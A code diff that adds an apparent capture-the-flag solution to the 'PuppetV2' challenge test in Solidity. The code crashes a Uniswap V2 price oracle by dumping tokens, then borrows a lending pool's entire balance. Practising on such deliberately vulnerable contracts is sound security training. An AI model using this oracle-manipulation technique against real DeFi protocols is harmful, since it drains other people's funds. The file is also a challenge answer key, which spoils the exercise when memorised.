@@ -118,7 +118,25 @@ contract PuppetV2 is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        weth.deposit{value:20 ether}();
+        console.log("Balance of weth after swap",weth.balanceOf(attacker));
+        console.log("balance of token after swap",dvt.balanceOf(attacker));
+        console.log("balance of ether after swap",attacker.balance);
 
+        address[] memory path = new address[](2);
+        path[1] = address(weth);
+        path[0] = address(dvt);
+        dvt.approve(address(uniswapV2Router),ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, attacker, block.timestamp + 5 days);
+        console.log("Balance of weth after trade",weth.balanceOf(attacker));
+        console.log("balance of token after trade",dvt.balanceOf(attacker));
+        console.log("balance of ether after trade",attacker.balance);
+
+        weth.approve(address(puppetV2Pool),weth.balanceOf(attacker));
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
